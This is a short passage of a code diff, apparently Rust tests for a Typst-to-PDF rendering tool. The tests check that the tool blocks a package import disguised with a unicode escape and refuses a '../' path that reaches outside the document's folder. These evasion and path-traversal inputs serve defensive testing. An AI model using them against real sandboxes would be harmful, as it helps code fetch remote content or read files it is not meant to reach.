+            "#import \"\\u{40}preview/cetz:0.3.4\": *",
+        ] {
+            let error = f
+                .call(
+                    &id(),
+                    json!({"name": "r", "format": "pdf", "content": body}),
+                )
+                .await
+                .unwrap_err();
+            eprintln!("typst import: {error}");
+            assert!(error.contains("failed to download package"), "{error}");
+        }
         // The body reads nothing outside the document's folder.
         for body in [
             "#image(\"../x.png\")",
